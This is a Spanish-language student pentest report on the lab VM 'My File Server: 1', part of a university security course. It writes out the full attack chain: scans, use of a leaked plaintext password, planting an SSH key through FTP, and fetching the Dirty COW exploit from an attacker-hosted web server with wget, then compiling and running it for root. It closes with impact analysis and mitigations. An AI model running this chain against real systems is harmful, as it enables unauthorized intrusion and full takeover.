ACTIVIDAD 09: PENTESTING DE MY FILE SERVER 1

Auditoría de seguridad ofensiva de caja negra (black-box) y escalada local de privilegios hasta superusuario (root).

ACTIVIDAD 09

INFORME TÉCNICO DE RED TEAM: PENTESTING DE MY FILE SERVER 1

Alumno: Alonso Castillo Omar Karim (179033)


Materia: CNO V – Seguridad Informática

Profesor: Mtro. Servando López Contreras


Universidad Politécnica de San Luis Potosí

1. Resumen Ejecutivo (Executive Summary)

El presente informe documenta la auditoría de seguridad ofensiva controlada realizada sobre el servidor virtual vulnerable **My File Server: 1**. El objetivo primordial de la evaluación consistió en simular un ataque cibernético realista bajo una metodología de **caja negra (black-box)** para identificar brechas críticas que pongan en riesgo la infraestructura empresarial.

Durante la auditoría se identificaron vulnerabilidades severas que, combinadas secuencialmente, permitieron comprometer la totalidad del sistema:

  • 1. Fuga de credenciales en texto plano: Presencia de una contraseña administrativa expuesta de manera pública en el archivo `/readme.txt` de la raíz del servidor web Apache.
  • 2. Recurso SMB inseguro: El recurso compartido `smbdata` del servicio Samba se encontraba expuesto y configurado de forma permisiva con privilegios completos de lectura y escritura.
  • 3. Escalada de privilegios a Root: Un kernel de Linux desactualizado y vulnerable a la falla **Dirty COW (CVE-2016-5195)** permitió elevar los privilegios de un usuario común (`smbuser`) a superusuario (`root`) de forma local e instantánea.

El nivel de riesgo asociado a esta máquina virtual es calificado técnicamente como Crítico (Alto). Un atacante con acceso a la red podría exfiltrar datos corporativos confidenciales, inyectar archivos maliciosos en la red y tomar control absoluto del servidor afectado.

2. Alcance (Scope) y Metodología

El alcance autorizado comprendió de forma exclusiva la evaluación técnica sobre el host local con la dirección IP **192.168.56.103** en un entorno de red segmentado (*Host-Only*). Se prohibió expresamente realizar ataques destructivos que causaran Denegación de Servicio (DoS).

Se implementó un enfoque metodológico estricto basado en las directrices del **PTES (Penetration Testing Execution Standard)** y el marco de pruebas web de **OWASP**, dividiéndose en 6 fases:

  1. Reconocimiento Pasivo y Activo de red.
  2. Enumeración detallada de servicios y versiones activas.
  3. Análisis y detección sistemática de vulnerabilidades.
  4. Explotación controlada para obtener acceso inicial.
  5. Post-explotación y escalamiento de privilegios locales.
  6. Análisis de impacto y generación de propuestas de mitigación.

3. Línea de Tiempo de la Intrusión (Attack Path)

A continuación se representa de forma visual la línea temporal de las fases de reconocimiento, explotación y escalada ejecutadas por el analista durante el pentesting:

  • 01

    Reconocimiento Pasivo (Mapeo de Capa 2)

    Descubrimiento dinámico de hosts activos en el segmento local mediante solicitudes ARP utilizando `netdiscover`, aislando con éxito la dirección IP de la víctima:

    sudo netdiscover -r 192.168.56.0/24 ==> Target VM IP Identified: 192.168.56.103
  • 02

    Escaneo Activo de Puertos e Identificación de Servicios

    Se lanzó un escaneo de puertos y servicios completo con `nmap` para revelar qué vectores de entrada TCP se encontraban disponibles en la IP identificada:

    nmap -p- -sV 192.168.56.103 ==> Open Ports: 21/tcp (FTP), 22/tcp (SSH), 80/tcp (HTTP), 139/445/tcp (SMB)
  • 03

    Enumeración Web y Fuga de Información Crítica

    Se utilizó el escáner de directorios web `nikto` sobre el puerto 80. La herramienta expuso la existencia del archivo `/readme.txt`, que contenía credenciales legibles:

    nikto -h http://192.168.56.103 ==> Directory Found: http://192.168.56.103/readme.txt ==> Plaintext string: "My password is rootroot1" (for smbuser)
  • 04

    Enumeración de Recursos Compartidos SMB

    Utilizando `smbmap` con las credenciales fugadas, se analizó el servidor Samba. Se constató que el recurso `smbdata` poseía permisos de lectura y escritura directos (R/W):

    sudo smbmap -u smbuser -p rootroot1 -H 192.168.56.103 ==> Share: "smbdata" - Permissions: READ / WRITE
  • 05

    Explotación y Establecimiento de Acceso Inicial

    Para asegurar un acceso remoto e indetectable por SSH sin alertas de login, se generó un par de llaves criptográficas SSH. Usando FTP, se accedió al servidor de archivos y se cargó la clave pública local en la carpeta `.ssh` remota como clave autorizada:

    sudo ssh-keygen -t ed25519 ftp 192.168.56.103 (smbuser / rootroot1) ftp> mkdir .ssh ftp> cd .ssh ftp> put id_ed25519.pub authorized_keys ssh smbuser@192.168.56.103 ==> Shell inicial establecida con éxito.

  • Post-Explotación: Escalada de Privilegios (Dirty COW)

    Una vez dentro por SSH, se detectó un Kernel de Linux vulnerable a la condición de carrera **Dirty COW (CVE-2016-5195)**. Se descargó el exploit `dirtyCow.c` levantando un servidor web local en Python en la máquina atacante, se compiló en la víctima usando `gcc` y se ejecutó para reescribir archivos raíz y convertirse en root:

    # Atacante python3 -m http.server 8080 # Víctima (SSH) wget http://192.168.56.102:8080/dirtyCow.c gcc dirtyCow.c -o Aznar -pthread ./Aznar whoami ==> root (¡Acceso de superusuario total establecido!)

4. Análisis de Impacto (Modelo CIA)

El compromiso total de la máquina virtual representa un impacto severo estructurado en las tres dimensiones CIA:

Confidencialidad

Crítico

El acceso a nivel root otorga visibilidad completa sobre todo el sistema de archivos del servidor. Credenciales de bases de datos, claves de cifrado y documentos confidenciales de la corporación alojados en los directorios de usuario son totalmente expuestos a exfiltración y espionaje.

Integridad

Crítico

Un atacante que escala privilegios a root tiene control absoluto de modificación. Puede alterar los logs de auditoría del sistema de manera destructiva para no dejar rastro, inyectar troyanos o scripts maliciosos de persistencia en la web legítima o alterar datos de bases de datos.

Disponibilidad

Crítico

Al controlar el kernel del servidor virtual, el atacante puede realizar un apagado destructivo del sistema de archivos, deshabilitar puertos de red locales o desplegar ransomware corporativo para encriptar la máquina y secuestrar las operaciones comerciales del negocio.

5. Tabla de Vulnerabilidades e Inventario de Hallazgos

A continuación se detallan de forma estructurada los hallazgos críticos detectados, con sus respectivos niveles de severidad y las propuestas técnicas de mitigación inmediata:

ID Vulnerabilidad Severidad Evidencia de Campo Recomendación y Mitigación
VULN-01 Almacenamiento de credenciales en texto plano en archivo público web Alta Archivo visible en el puerto 80 bajo la URL `http://192.168.56.103/readme.txt` que expone directamente la contraseña. Eliminar de inmediato archivos con contraseñas en texto plano de directorios públicos. Implementar políticas de robustez y rotación periódica.
VULN-02 Permisos excesivos de escritura (R/W) en recurso compartido SMB público Media Mapeo de Samba mediante `smbmap` exponiendo el recurso `smbdata` con permisos completos de escritura. Aplicar listas de control de acceso (ACLs) y el principio de mínimo privilegio. Configurar la share en modo *Read-Only* salvo justificación estricta.
VULN-03 Kernel desactualizado propenso a escalada local de privilegios (Dirty COW) Crítica Explotación exitosa local inyectando y ejecutando el binario compilado `Aznar` (CVE-2016-5195) obteniendo root. Actualizar el Kernel del sistema operativo Linux de forma inmediata con los últimos parches de seguridad provistos por el fabricante.

6. Conclusión y Recomendaciones Organizacionales

El pentesting de **My File Server 1** ha evidenciado que el riesgo en ciberseguridad no suele nacer de una única falla catastrófica, sino del **encadenamiento de brechas lógicas menores** (fuga de contraseña en texto plano, permisos dinámicos débiles en SMB y parches de sistema pendientes en el kernel). La combinación de estas tres fallas permitió a un atacante externo e inicial sin privilegios convertirse en el administrador definitivo (root) de la infraestructura.

Se recomienda con carácter urgente programar una ventana de mantenimiento para aplicar parches de kernel a la máquina virtual, restringir accesos en red mediante reglas de cortafuegos restrictivas y habilitar auditorías de código internas para impedir la publicación de claves en texto plano en servidores de cara al público.
